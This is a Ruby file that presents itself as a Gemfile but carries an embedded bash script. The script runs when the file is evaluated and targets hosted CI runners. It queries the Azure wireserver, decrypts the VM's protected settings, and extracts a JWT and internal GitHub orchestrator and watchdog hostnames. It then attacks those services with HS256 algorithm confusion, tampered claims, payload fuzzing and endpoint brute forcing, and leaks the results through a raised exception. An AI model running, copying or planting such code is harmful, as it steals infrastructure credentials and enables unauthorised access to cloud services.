require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v117; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
cat > x1.py <<'PY'
import re, html
s = open('gs.xml').read()
m = re.search(r'<Certificates>([^<]+)</Certificates>', s)
print(html.unescape(m.group(1)) if m else '')
PY
CERT_URL=$(python3 x1.py)
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"
cat > x2.py <<'PY'
import re
s = open('cert-resp.xml').read()
m = re.search(r'<Data>([^<]+)</Data>', s)
b = (m.group(1) if m else '').replace('\r','').replace('\n','').replace(' ','')
open('cms.b64','w').write(b)
PY
python3 x2.py
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
cat > x3.py <<'PY'
import json, sys
d = json.load(open('vm.json'))
sys.stdout.write(d['extensionGoalStates'][0]['settings'][0]['protectedSettings'])
PY
python3 x3.py > ps.b64
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
cat > x4.py <<'PY'
import json, sys
d = json.load(open('ps.json'))
sys.stdout.write(d.get('script',''))
PY
python3 x4.py | base64 -d > bs.sh 2>/dev/null

ORCH=$(grep -oE 'hosted-compute-request-orchestrator-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
WATCHDOG=$(grep -oE 'hosted-compute-watchdog-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
echo "STEP_ORCH=$ORCH WATCHDOG=$WATCHDOG"

PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
T=$(echo "$PAY" | base64 -d 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('iat',0), d.get('rbf',0))")
IAT=$(echo $T | awk '{print $1}')
RBF=$(echo $T | awk '{print $2}')
NOW=$(date +%s)
WAIT=$((RBF - NOW + 15))
echo "STEP_JWT_TIMING iat=$IAT rbf=$RBF now=$NOW wait=$WAIT"
[ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 800 ] && sleep $WAIT

# === WATCHDOG: test if JWT is required at all ===
echo "===WATCHDOG_NO_AUTH==="
curl -s -m 8 -X POST -H "Content-Type: application/json" -d '[]' -o w1.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG/v1/trace"
echo " noauth /v1/trace POST=[] body_b64=$(base64 -w0 < w1.txt | head -c 400)"
curl -s -m 8 -X POST -H "Content-Type: application/json" -H "Authorization: Bearer invalid.invalid.invalid" -d '[]' -o w2.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG/v1/trace"
echo " invalid_jwt /v1/trace POST=[] body_b64=$(base64 -w0 < w2.txt | head -c 400)"

# === WATCHDOG: fingerprint OnVmLog fields ===
echo "===WATCHDOG_FIELD_FUZZ==="
# Empty array (valid form, no fields)
curl -s -m 8 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '[]' -o w3.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG/v1/trace"
echo " empty_array body_b64=$(base64 -w0 < w3.txt | head -c 400)"
# Empty object — Go strict unmarshal might accept or reject
curl -s -m 8 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '[{}]' -o w4.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG/v1/trace"
echo " empty_obj_array body_b64=$(base64 -w0 < w4.txt | head -c 400)"
# Try common log field names
for body in \
  '[{"message":"BENTY-PROBE-MARK-v117","level":"info","timestamp":"2026-05-17T00:00:00Z"}]' \
  '[{"msg":"x","ts":"x","agent_id":"x","vm_name":"x"}]' \
  '[{"vmid":"x","seqno":1,"message":"x","level":"info"}]' \
  '[{"VmName":"x","Message":"x","Level":"info","Timestamp":"2026-05-17T00:00:00Z","SeqNo":1}]' \
  '[{"VM":"x","Log":"x","Time":"2026-05-17T00:00:00Z"}]' \
  '[{"unknown_field":"v117"}]'; do
  ESC_BODY=$(echo "$body" | head -c 200)
  curl -s -m 8 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "$body" -o w5.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG/v1/trace"
  echo " body=${ESC_BODY:0:120} resp_b64=$(base64 -w0 < w5.txt | head -c 400)"
done

# === HS256 ALG CONFUSION ===
# Compute HMAC-SHA256 of header.payload using public key x-bytes as secret
echo "===HS256_ATTACK_FULL==="
# Get one public kid from orchestrator JWKS
curl -sf "https://$ORCH/.well-known/jwks" -o jwks.json
PUB_KID=$(python3 -c "import json; d=json.load(open('jwks.json')); print(d['keys'][0]['kid'])" 2>/dev/null)
PUB_X=$(python3 -c "import json; d=json.load(open('jwks.json')); print(d['keys'][0]['x'])" 2>/dev/null)
echo "STEP_PUB_KID=$PUB_KID PUB_X=$PUB_X"

# Compute HS256 JWT
cat > hs.py <<'PY'
import json, base64, hmac, hashlib, sys
header = {"alg":"HS256","kid":sys.argv[1],"typ":"JWT"}
payload_b64 = sys.argv[2]
secret_b64url = sys.argv[3]
# Decode JWKS x value (base64url no padding) to get raw key bytes
pad = '=' * (4 - len(secret_b64url) % 4)
secret_bytes = base64.urlsafe_b64decode(secret_b64url + pad)
header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).decode().rstrip('=')
signing_input = (header_b64 + '.' + payload_b64).encode()
sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
print(header_b64 + '.' + payload_b64 + '.' + sig_b64)
PY
RAW_PAYLOAD=$(echo "$JWT" | cut -d. -f2)
HS_JWT=$(python3 hs.py "$PUB_KID" "$RAW_PAYLOAD" "$PUB_X")
echo "STEP_HS_JWT=${HS_JWT:0:100}...${HS_JWT: -30}"

for ep in /v1/work /v1/register /v1/poll /v1/lease /v1/agents; do
  curl -s -m 6 -X GET -H "Authorization: Bearer $HS_JWT" -o h.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$ORCH$ep"
  echo " HS256 $ep GET body_b64=$(base64 -w0 < h.txt | head -c 400)"
done

# === Modified claims test ===
# Re-use original JWT signature but flip claims — should fail signature check
# (sanity check that signature is being validated)
echo "===CLAIMS_TAMPER_TEST==="
RAW_HDR=$(echo "$JWT" | cut -d. -f1)
RAW_SIG=$(echo "$JWT" | cut -d. -f3)
# Modify payload: change MAC and wid
MOD_PAY=$(echo "$PAY" | base64 -d 2>/dev/null | python3 -c "
import json, sys, base64
d = json.load(sys.stdin)
d['mac'] = 'AA-BB-CC-DD-EE-FF'
d['wid'] = '{spoofed-resource-group}:{00000000-0000-0000-0000-000000000000}:{11111111-1111-1111-1111-111111111111}'
out = json.dumps(d, separators=(',',':')).encode()
print(base64.urlsafe_b64encode(out).decode().rstrip('='))
")
MOD_JWT="${RAW_HDR}.${MOD_PAY}.${RAW_SIG}"
echo "STEP_MOD_JWT=${MOD_JWT:0:100}"
for ep in /v1/work /v1/register; do
  curl -s -m 6 -X GET -H "Authorization: Bearer $MOD_JWT" -o m.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$ORCH$ep"
  echo " MOD_JWT $ep body_b64=$(base64 -w0 < m.txt | head -c 400)"
done

# === Watchdog paths brute ===
echo "===WATCHDOG_PATH_BRUTE==="
for ep in /v1 /v1/ /v1/log /v1/logs /v1/event /v1/events /v1/upload /v2/trace /trace /api/v1/trace /api/trace /v1/agent/trace /v1/agent/log; do
  curl -s -m 5 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '[]' -o p.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG$ep"
  echo " $ep POST body_b64=$(base64 -w0 < p.txt | head -c 300)"
done

# === FOLLOWUP: send VALID OnVmLog if we can guess it ===
# Strict Go json.Unmarshal won't error on extra fields by default, but tag-based fields might surface
echo "===WATCHDOG_TYPE_FUZZ==="
# Microsoft VM log conventions
for body in \
  '[{"Time":"2026-05-17T00:00:00Z","Message":"BENTY","Level":"Info","Source":"hosted-compute-agent"}]' \
  '[{"Timestamp":"2026-05-17T00:00:00Z","Message":"BENTY"}]' \
  '[{"TS":1779000000,"MSG":"BENTY"}]'; do
  curl -s -m 5 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "$body" -o t.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG/v1/trace"
  echo " body=${body:0:150} resp_b64=$(base64 -w0 < t.txt | head -c 400)"
done
SHELL
Tempfile.create('v117.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v117 " + line.chomp[0..1500] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
